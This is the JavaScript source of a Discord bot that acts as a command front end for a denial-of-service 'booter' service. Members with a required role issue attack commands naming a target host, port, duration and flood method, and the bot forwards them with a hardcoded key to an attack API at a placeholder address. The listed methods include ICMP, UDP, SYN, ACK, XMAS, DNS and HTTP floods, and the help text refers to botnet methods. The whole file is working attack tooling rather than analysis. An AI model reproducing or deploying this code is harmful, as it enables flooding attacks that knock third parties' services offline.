const discord = require('discord.js');
var axios = require('axios');
const config = require('./Old_config.json');
const client = new discord.Client();
function Warn(msg) { var embed = new discord.RichEmbed().setTitle(msg).setColor('#CF9B10'); return embed; }
function isLetter(c) { return c.toLowerCase() != c.toUpperCase(); }
client.on('message', (msg) => { if(msg.content === config.prefix + 'help' && msg.channel.id === config.channel && msg.member.roles.has(config.required)) { const embed = new discord.RichEmbed().setTitle('Commands').setDescription('\r\n\r\n' + config.prefix + 'attack <host> <time> <port> <method>\r\n' + config.prefix + 'stop <host>\r\n(WARN: STOP DONT WORK IN BOTNET METHODS)\r\n\r\n').addField('Methods', '\r\nLayer3: ICMP\r\nLayer4: UDP, STD, DNS, ADV, UDP-RAW, XMAS, ACK, SYN\r\n Layer7: HTTP-PPS, HTTP-GHP\r\n').setColor('#CF9B10'); msg.channel.send(embed); }});
client.on('message', (msg) => { if(msg.content.startsWith(config.prefix + 'stop') && msg.channel.id === config.channel && msg.member.roles.has(config.required))
{
  const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
  if(args.length < 1) { msg.channel.send(Warn('Invalid args!')); return;  }
  axios.get('http://000.000.000.000/api.php?host=' + args[1] + '&port=' + args[2]  + '&time=' + args[3]  + '&method=STOP&key=1337').then(response => 
  {
    switch(response.data)
    {
     case "Started": msg.channel.send(Warn('Attack stoped on '+ args[1] + '!')); break;
     case "NotRunning": msg.channel.send(Warn('doesnt have any attacks on '+ args[1] + '!')); break;
     default: msg.channel.send(Warn('Bot could not connect to api...')); break;
    }
  });  
}});
client.on('message', (msg) => { if(msg.content.startsWith(config.prefix + 'attack') && msg.channel.id === config.channel && msg.member.roles.has(config.required))
{ 
    const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
    if(args.length < 4) { msg.channel.send(Warn('Invalid args!')); return;  }
    if(args[1].length > 15) { msg.channel.send(Warn('Invalid host lenght!')); return; } 
    if(args[1].length < 7) { msg.channel.send(Warn('Invalid host lenght!')); return; } 
    if(isLetter(args[1])) {  msg.channel.send(Warn('Host cannot contain characters!')); return; }
    if(isLetter(args[2])) { msg.channel.send(Warn('Port cannot contain characters!')); return; }
    if(isLetter(args[3])) { msg.channel.send(Warn('Time cannot contain characters!')); return; }
    if(Number(args[2]) > 65535) { msg.channel.send(Warn('Max port size is 65535!')); return; }
    if(Number(args[3]) > config.maxtime) { msg.channel.send(Warn('Max time is ' + config.maxtime +  ' seconds!')); return; }
    if(Number(args[3]) < config.mintime) { msg.channel.send(Warn('Min time is ' + config.mintime +  ' seconds!')); return; }
    switch(args[4])
    {
      case "HTTP-PPS": break; case "HTTP-GHP": break; case "ICMP": break; case "XMAS": break; case "SYN": break; case "ACK": break; case "UDP-RAW": break; 
      case "UDP": break; case "STD": break; case "DNS": break;  case "ADV": break;
      default: msg.channel.send(Warn('Invalid attack method!')); break;
    }  
    axios.get('http://000.000.000.000/api.php?host=' + args[1] + '&port=' + args[2]  + '&time=' + args[3]  + '&method=' + args[4] + "&key=1337").then(response => 
    {
      switch(response.data)
      {
       case "Started": msg.channel.send(Warn('Attack started on ' + args[1] + ' for ' + args[3] + ' seconds!')); break;
       case "Running": msg.channel.send(Warn('Already have an attack running on ' + args[1] + ' !')); break;
       case "Invalid": msg.channel.send(Warn(args[1] + ' is blacklisted!')); break;
       default: msg.channel.send(Warn('Bot could not connect to api...')); break;
      }
    });    
}});
client.on('ready', () => { console.log('Connected!'); client.user.setActivity(config.prefix + 'help'); });
client.login(config.token); 